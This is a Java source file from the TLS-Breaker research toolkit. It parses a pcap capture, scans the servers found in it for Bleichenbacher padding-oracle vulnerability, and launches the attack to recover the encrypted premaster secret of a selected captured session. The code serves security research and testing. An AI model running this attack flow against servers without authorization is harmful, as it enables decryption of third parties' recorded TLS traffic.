/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 * <p>
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 * <p>
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.bleichenbacher.impl;

import de.rub.nds.tlsattacker.core.config.TLSDelegateConfig;
import de.rub.nds.tlsbreaker.bleichenbacher.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapAnalyzer;
import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapSession;
import org.apache.commons.codec.binary.Hex;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.*;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

public class PcapFileHandler {

    private static final Logger LOGGER = LogManager.getLogger();
    BleichenbacherCommandConfig bleichenbacherCommandConfig;

    public PcapFileHandler(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        this.bleichenbacherCommandConfig = bleichenbacherCommandConfig;
    }

    public void handlePcapFile() {
        PcapAnalyzer pcapAnalyzer = new PcapAnalyzer(bleichenbacherCommandConfig.getPcapFileLocation());
        List<PcapSession> sessions = pcapAnalyzer.getAllSessions();

        if (!sessions.isEmpty()) {
            ServerSelection serverSelection = new ServerSelection(sessions);
            Map<String, List<PcapSession>> serverSessionsMap = serverSelection.getServerSessionsMap();
            List<String> uniqueServers = new ArrayList<>(serverSessionsMap.keySet());
            if (!uniqueServers.isEmpty()) {
                CONSOLE.info("Found " + uniqueServers.size() + " servers from the pcap file.");
                ConsoleInteractor consoleInteractor = new ConsoleInteractor();
                consoleInteractor.displayServerDetails(uniqueServers, serverSessionsMap);
                String userOption = serverSelection.getValidUserSelection(uniqueServers, consoleInteractor);
                if ("N".equals(userOption)) {
                    CONSOLE.info("Execution of the attack cancelled.");
                } else if ("a".equals(userOption)) {
                    checkVulnerabilityOfAllServersAndDisplay(uniqueServers, bleichenbacherCommandConfig,
                                                             serverSessionsMap, consoleInteractor);
                } else if (isCommaSeparatedList(userOption)) {
                    List<String> hosts = new ArrayList<>();
                    Arrays.stream(userOption.split(","))
                          .forEach(serverNumber -> hosts.add(uniqueServers.get(Integer.parseInt(serverNumber) - 1)));

                    checkVulnerabilityOfAllServersAndDisplay(hosts, bleichenbacherCommandConfig, serverSessionsMap,
                                                             consoleInteractor);
                } else {
                    // TODO: place this in else block?
                    String host = uniqueServers.get(Integer.parseInt(userOption) - 1);
                    // TODO: print entire information which is displayed to user when showing server options.
                    LOGGER.info("Selected server: " + host);
                    bleichenbacherCommandConfig.getClientDelegate().setHost(host);
                    Boolean vulnerability = checkVulnerability(bleichenbacherCommandConfig);
                    if (Objects.equals(vulnerability, Boolean.TRUE)) {
                        CONSOLE.info("Server " + host + " is vulnerable.");
                        selectSessionAndExecuteAttack(serverSessionsMap, host, bleichenbacherCommandConfig,
                                                      consoleInteractor);
                    } else {

                    }
                }
            } else {
                CONSOLE.info("\nFound no potential servers for Bleichenbacher attack.");
            }
        } else {
            // TODO: throw exception
        }
    }

    private void checkVulnerabilityOfAllServersAndDisplay(List<String> uniqueServers,
                                                          BleichenbacherCommandConfig bleichenbacherCommandConfig,
                                                          Map<String, List<PcapSession>> serverSessionsMap,
                                                          ConsoleInteractor consoleInteractor) {
        List<String> vulnerableServers = getVulnerableServers(uniqueServers, bleichenbacherCommandConfig);
        CONSOLE.info("Found " + vulnerableServers.size() + " server that are vulnerable.");
        if (!vulnerableServers.isEmpty()) {
            displayVulnerableServers(vulnerableServers, serverSessionsMap, consoleInteractor);
        }
        if (vulnerableServers.size() == 1) {
            String host = vulnerableServers.get(0);
            CONSOLE.info("Session details of " + host + " server:");
            selectSessionAndExecuteAttack(serverSessionsMap, host, bleichenbacherCommandConfig, consoleInteractor);
        } else if (vulnerableServers.size() > 1) {
            CONSOLE.info("Please select a server to view session details.");
            CONSOLE.info("server number: ");
            int serverNumber = getUserSelectedServer(uniqueServers);
            String host = uniqueServers.get(serverNumber - 1);
            selectSessionAndExecuteAttack(serverSessionsMap, host, bleichenbacherCommandConfig, consoleInteractor);
        }

    }

    private List<String> getVulnerableServers(List<String> uniqueServers,
                                              BleichenbacherCommandConfig bleichenbacherCommandConfig) {

        List<String> vulnerableServers = new ArrayList<>();
        for (String server : uniqueServers) {
            bleichenbacherCommandConfig.getClientDelegate().setHost(server);

            Attacker<? extends TLSDelegateConfig> attacker =
                    new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());

            try {
                Boolean result = attacker.checkVulnerability();
                if (Objects.equals(result, Boolean.TRUE)) {
                    CONSOLE.error("Vulnerable:" + result.toString());
                    vulnerableServers.add(server);
                }
            } catch (UnsupportedOperationException e) {
                LOGGER.info("The selected attacker is currently not implemented");
            }
        }
        return vulnerableServers;
    }

    private void displayVulnerableServers(List<String> vulnerableServers,
                                          Map<String, List<PcapSession>> serverSessionsMap,
                                          ConsoleInteractor consoleInteractor) {
        consoleInteractor.displayServerDetails(vulnerableServers, serverSessionsMap);
    }

    private void selectSessionAndExecuteAttack(Map<String, List<PcapSession>> serverSessionsMap, String host,
                                               BleichenbacherCommandConfig bleichenbacherCommandConfig, ConsoleInteractor consoleInteractor) {
        List<PcapSession> hostSessions = serverSessionsMap.get(host);
        consoleInteractor.displaySessionDetails(hostSessions);
        PcapSession selectedSession = consoleInteractor.getUserSelectedSession(hostSessions);
        if (selectedSession != null) {
            executeAttack(selectedSession, bleichenbacherCommandConfig);
        }
    }

    private int getUserSelectedServer(List<String> uniqueServers) {
        Scanner sc = new Scanner(System.in);
        try {
            int serverNumber = sc.nextInt();
            if (serverNumber > 0 && serverNumber <= uniqueServers.size()) {
                return serverNumber;
            } else {
                throw new UnsupportedOperationException();
            }

        } catch (Exception e) {
            throw new UnsupportedOperationException();
        }
    }

    private void executeAttack(PcapSession session, BleichenbacherCommandConfig bleichenbacherCommandConfig) {

        bleichenbacherCommandConfig.getClientDelegate().setHost(session.getDestinationHost());
        bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(session));
        LOGGER.info("host=" + bleichenbacherCommandConfig.getClientDelegate().getHost()
                            + " and encryptedPremasterSecret=" + bleichenbacherCommandConfig.getEncryptedPremasterSecret());

        Attacker<? extends TLSDelegateConfig> attacker =
                new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        attacker.attack();
    }

    private String getPreMasterSecret(PcapSession session) {
        String preMasterSecret = null;
        byte[] pms = session.getPreMasterSecret();
        preMasterSecret = new String(Hex.encodeHex(pms));
        return preMasterSecret;
    }

    private boolean isCommaSeparatedList(String userOption) {
        return userOption.contains(",");
    }

    private Boolean checkVulnerability(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
        Attacker<? extends TLSDelegateConfig> attacker =
                new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
        Boolean result = null;
        try {
            result = attacker.checkVulnerability();
            if (Objects.equals(result, Boolean.TRUE)) {
                CONSOLE.error("Vulnerable:" + result.toString());
            } else if (Objects.equals(result, Boolean.FALSE)) {
                CONSOLE.info("Vulnerable:" + result.toString());
            } else {
                CONSOLE.warn("Vulnerable: Uncertain");
            }
        } catch (UnsupportedOperationException e) {
            LOGGER.info("The selected attacker is currently not implemented");
        }
        return result;
    }
}
